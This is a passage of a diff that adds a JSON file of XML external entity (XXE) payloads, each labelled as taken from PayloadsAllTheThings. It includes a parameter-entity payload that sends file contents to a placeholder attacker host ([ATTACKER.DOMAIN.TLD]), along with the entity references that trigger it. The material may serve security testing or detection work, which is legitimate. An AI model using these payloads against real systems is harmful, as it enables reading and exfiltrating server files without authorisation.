+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x=%payload;\">'>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%param1;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%external;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  }
+]
